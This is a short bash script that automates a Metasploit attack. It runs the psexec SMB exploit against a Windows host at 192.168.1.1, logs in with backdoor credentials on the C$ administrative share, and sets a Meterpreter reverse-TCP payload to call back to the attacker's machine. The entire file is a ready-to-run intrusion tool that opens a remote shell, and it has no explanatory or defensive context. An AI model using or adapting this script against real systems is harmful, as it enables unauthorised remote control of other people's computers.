#!/bin/bash

ATTACKER_INTERFACE="eth0"
VICTIM_IP="192.168.1.1"
BACKDOOR_USER="user"
BACKDOOR_PASS=$BACKDOOR_USER

ATTACKER_IP=`ifconfig ${ATTACKER_INTERFACE} | grep 'inet ' | xargs | cut -d' ' -f2`
EXPLOIT="use exploit/windows/smb/psexec"
EXPLOIT_PARAMETERS=("set RHOST ${VICTIM_IP}" "set SMBUSER ${BACKDOOR_USER}" "set SMBPASS ${BACKDOOR_PASS}" "set SHARE C$")
PAYLOAD="set PAYLOAD windows/meterpreter/reverse_tcp"
PAYLOAD_PARAMETERS=("set LHOST ${ATTACKER_IP}")

MSF_PARAMETERS=$(IFS=$';'; echo "${EXPLOIT}; ${EXPLOIT_PARAMETERS[*]}; ${PAYLOAD}; ${PAYLOAD_PARAMETERS}; exploit")
msfconsole -x "$MSF_PARAMETERS"